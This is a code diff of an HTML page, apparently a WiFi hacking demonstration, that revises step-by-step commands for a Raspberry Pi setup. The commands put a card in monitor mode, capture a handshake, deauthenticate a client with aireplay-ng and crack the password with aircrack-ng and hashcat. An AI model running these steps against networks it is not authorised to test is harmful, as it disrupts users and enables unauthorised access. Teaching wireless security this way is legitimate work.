@@ -428,7 +428,7 @@ wc -l mangled_wordlist.txt</code></pre>
       <rect width="150" height="90" rx="8" ry="8" fill="url(#computerGradient)" stroke="#333" stroke-width="1" />
 
       <text x="75" y="20" text-anchor="middle" font-weight="bold" font-size="12">
-        Kali Linux
+        Raspberry Pi
       </text>
 
       <text x="75" y="40" text-anchor="middle" font-size="10">
@@ -494,47 +494,40 @@ wc -l mangled_wordlist.txt</code></pre>
   <h2>Step-by-Step WiFi Hacking Demonstration</h2>
 
   <ol>
-    <li>
+    <!-- <li>
       <strong>Prepare the Kali Linux Environment:</strong>
       <p>Connect to the Kali machine:</p>
       <pre class="pre-wrap"><code>docker exec -it kali bash</code></pre>
-    </li>
+    </li> -->
 
     <li>
       <strong>WiFi Network Reconnaissance:</strong>
       <p>Scan for available WiFi networks:</p>
       <pre class="pre-wrap"><code>airmon-ng</code></pre>
+      <small>TIP: check out <code>sudo</code> for running programs as root</small>
       <p>Put wireless interface into monitor mode:</p>
-      <pre class="pre-wrap"><code>airmon-ng start wlan0</code></pre>
+      <pre class="pre-wrap"><code>airmon-ng start wlan1</code></pre>
       <p>Scan for networks:</p>
-      <pre class="pre-wrap"><code>airodump-ng wlan0mon</code></pre>
+      <pre class="pre-wrap"><code>airodump-ng wlan1</code></pre>
+      <small>When your WiFi target is acquired, press Ctrl+c to quit.</small>
     </li>
 
     <li>
       <strong>Capture WiFi Handshake:</strong>
       <p>Target a specific network and capture the authentication handshake:</p>
-      <pre class="pre-wrap"><code>airodump-ng -c [CHANNEL] --bssid [MAC_ADDRESS] -w capture wlan0mon</code></pre>
+      <pre class="pre-wrap"><code>airodump-ng -c [CHANNEL] --bssid [MAC_ADDRESS] -w capture wlan0</code></pre>
       <p>Deauthenticate a connected client to force re-authentication:</p>
-      <pre class="pre-wrap"><code>aireplay-ng -0 1 -a [ROUTER_MAC] -c [CLIENT_MAC] wlan0mon</code></pre>
+      <pre class="pre-wrap"><code>aireplay-ng -0 1 -a [ROUTER_MAC] -c [CLIENT_MAC] wlan0</code></pre>
     </li>
 
     <li>
       <strong>Crack the Password:</strong>
       <p>Use aircrack-ng with a wordlist:</p>
-      <pre class="pre-wrap"><code>aircrack-ng -w wordlist.txt capture-01.cap</code></pre>
+      <pre class="pre-wrap"><code>aircrack-ng -w top-passwords-2024.txt capture-01.cap</code></pre>
       <p>Or use hashcat for more advanced cracking:</p>
-      <pre class="pre-wrap"><code>hashcat -m 2500 capture-01.handshake /path/to/wordlist.txt</code></pre>
+      <pre class="pre-wrap"><code>hashcat -m 2500 capture-01.handshake top-passwords-2024.txt</code></pre>
     </li>
   </ol>
-
-  <h2>Password Cracking Techniques</h2>
-
-  <div class="status-section">
-    <h3>Wordlist Generation</h3>
-    <p>Create custom wordlists using Crunch:</p>
-    <pre class="pre-wrap"><code>crunch 8 12 0123456789ABCDEF -o wifi-passwords.txt</code></pre>
-    <p>This generates passwords between 8-12 characters using hexadecimal characters.</p>
-  </div>
 
 </body>
 
